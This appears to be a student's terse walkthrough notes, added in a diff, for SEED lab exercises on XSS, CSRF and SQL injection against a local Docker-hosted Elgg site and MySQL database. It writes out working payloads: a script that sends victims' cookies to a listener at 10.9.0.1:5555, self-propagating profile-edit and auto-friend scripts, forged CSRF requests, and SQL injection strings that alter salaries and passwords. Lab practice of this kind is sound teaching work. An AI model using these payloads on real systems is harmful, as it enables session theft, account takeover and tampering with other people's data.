@@ -1,0 +1,260 @@
+1. deleting containers
+docker rm -vf $(docker ps -a -q)
+
+2. deleting images
+docker rmi -f $(docker images -a -q)
+
+3. clean database
+sudo rm -rf mysql_data
+
+3. modify this file to add seed-server.com
+sudo gedit /etc/hosts
+
+3. build docker container
+dcbuild
+
+4. run the containner
+dcup
+
+5. check if the container is running
+dockps
+
+this will create two folders -
+
+6. open host file
+sudo gedit /etc/hosts &>/dev/null & 
+
+7. docker exec it
+docksh container_id
+
+service apache2 reload
+
+8. go to www.seed-server.com
+
+9. login as samy pass:seedsamy
+
+10. go to http://www.seed-server.com/profile/samy/edit
+
+11. in the brief description write-
+for 3.1
+<script>alert("attack with XSS!");</script>
+<script type="text/javascript" src="http://www.example.com/myscript.js"></script>
+
+
+12. save the changes
+
+13. logout and login with alice pass:seedalice
+
+14. go to members and then samy's profile http://www.seed-server.com/profile/samy
+
+15. again do 9, 10, then add the following line in about me section with visual editor on(http://www.seed-server.com/profile/samy/edit)
+for 3.2
+<script>alert(document.cookie);</script>
+again do 12,13,14
+
+16. follow step 15
+task 3.3
+<script>document.write('<img src=http://10.9.0.1:5555?c='+ escape(document.cookie) + '>');</script>
+
+17. type this command on cmd from labsetup folder
+nc -l 5555
+
+18. do step 13,14
+19. for task 3.4:
+create file addfriend.js and write necessary codes there to automatically send friend request to samy
+<script type="text/javascript">
+window.onload = function(){
+var Ajax=null;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+var sendurl="http://www.seed-server.com/action/friends/add"+"?friend=59"+token+ts;
+Ajax=new XMLHttpRequest();
+Ajax.open("GET", sendurl, true);
+Ajax.send();
+}
+</script>
+
+<script type="text/javascript">
+window.onload = function(){
+var userName="&name="+elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+var desc= "&description=Samy is my hero"+"&accesslevel[description]=2";
+var content=token+ts+userName+desc+guid;
+var samyGuid=59; 
+var sendurl="http://www.seed-server.com/action/profile/edit";
+if(elgg.session.user.guid!=samyGuid)
+{
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST", sendurl, true);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.send(content);
+}
+}
+</script>
+
+
+20. view page source of edit profile page of samy as replace the above code segment
+21. check if samy has any friend
+22. then go to alices profile aaand visit samy's page
+
+
+
+CSRF --->
+
+1. dcbuild
+2. dcup
+
+dockps
+attacker container id
+
+
+task 1
+
+alice login request http header lives
+__elgg_token=SXbezSOERZBlq-jssqPdqA&__elgg_ts=1658053524&username=alice&password=seedalice
+http://www.seed-server.com/action/login
+
+go to www.attacker32.com
+
+task 2
+
+add a friend url get request
+http://www.seed-server.com/action/friends/add?friend=56&__elgg_ts=1658054445&__elgg_token=CSwVWaIdECY92WKOXy9VzA&__elgg_ts=1658054445&__elgg_token=CSwVWaIdECY92WKOXy9VzA
+ 
+ get samy's user id
+
+cd to attacker folder, run docksh attacker-container-id
+
+ls /var/www/
+ls /var/www/attacker/
+cd /var/www/attacker/
+nano addfriend.html
+modify the url of image src then ctrls an ctrl+x
+or go to cd attacker folder
+then -----
+docker cp addfriend.html 17be25712377:/var/www/attacker/
+cat addfriend.html
+ - to chack if the modification is okay
+
+
+login as alice as visit the website
+
+
+task 3 
+
+edit samy's profile with http header live
+compare with http header live and modify filed and action of this file
+find out alice guid and replace it
+docker cp editprofile.html 17be25712377:/var/www/attacker/
+cat editprofile.html
+
+
+task 4
+inside docksh elggcontainer
+cd /var/www/elgg/vendor/elgg/elgg/engine/classes/Elgg/Security
+ls 
+nano Csrf.php
+find validate function and comment the return statement
+cat Csrf.php
+
+
+
+SQL Injection
+
+inside image_mysql folder check dockerfile
+ENV MYSQL_ROOT_PASSWORD=dees
+ENV MYSQL_USER=seed 
+ENV MYSQL_PASSWORD=dees
+ENV MYSQL_DATABASE=sqllab_users
+
+service apache2 reload
+dcup
+dockps
+
+task 1
+docksh 5ca67f10cb9e -- mysql container 
+run this inside container---
+mysql -u root -pdees
+show databases;
+use sqllab_users;
+show tables;
+describe credential;
+select * from credential;
+
+task2
+
+go to www folder open up unsafe_home.php and explain some parts of this parts
+for task 2.1
+go to line no 75 of this file to build the query
+add line no 76 to see the sql query--> echo $sql
+for commenting the part after $input_uname, 
+write Admin'-- in the user name field where -- will work as comment
+now you'll able to see the sql command
+write Admin' # here # work as comment
+
+docksh 1405bfeb22f1 --- www 
+ls /var/www/
+ls /var/www/SQL_Injection/
+cd !*
+
+open new tab for terminal
+ls
+cd image_www/
+ls
+cd Code/
+ls
+docker cp unsafe_home.php 1405bfeb22f1:/var/www/SQL_Injection/
+
+task 2.2
+normal cmd of labsetup 
+curl 'www.seed-server.com/unsafe_home.php?username=alice&Password=11'
+we need to ommit the part after username and for this we need 
+single-quote(%27)and hash(%23) 
+go to urlencoder.org and write '# it'll result in %27%20%23
+
+curl 'www.seed-server.com/unsafe_home.php?username=alice%27%20%23&Password=11'
+
+task 2.3
+inside docksh mysql container
+write the command
+select 1; select 2;
+
+in username put Alice'; select 1;
+inside docksh myql_container run this
+SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password FROM credential WHERE name= 'Alice'; select 1;#' and Password='da39a3ee5e6b4b0d3255bfef95601890afd80709';
+get url encoder of '; select 1;# = %27%3B%20select%201%3B%23
+curl 'www.seed-server.com/unsafe_home.php?username=alice%27%3B%20select%201%3B%23&Password=11'
+in folder www code unsafe.php line no 78 make this multi_query instead od only query
+
+task 3.1
+go to www/code folder and edit unsafe_edit_backend.php at line no 56 $_SESSION['PROFILE_SQL']=$sql;;
+docker cp unsafe_edit_backend.php 1405bfeb22f1:/var/www/SQL_Injection/
+unsafe home php line no ---> 77        echo $sql;
+      echo $_SESSION['PROFILE_SQL'];
+      docker cp unsafe_home 1405bfeb22f1:/var/www/SQL_Injection/
+
+in alice profile edit ---> set nickname = Alice', salary=1000000#
+
+task 3.2
+boby the great', salary=10 where Name='Boby';#
+
+task 3.3
+', password=sha1('123') where Name='Boby';# 
+
+task 4
+cd /var/www/SQL_Injection/defense/
+
+open undafe.php comment from line 25 to 38
+then wriote things on line 39
+$stml = $conn->prepare("SELECT id, name, eid, salary, ssn
+                        FROM credential
+                        WHERE name= ? and Password= ?");
+                        
+$stml->bind_param("is", $input_uname, $hashed_pwd);
+$stml->execute();
+$stml->bind_result($id_name, $name, $eid, $salary, $ssn);
+$stml->fetch();
+$stml->close();
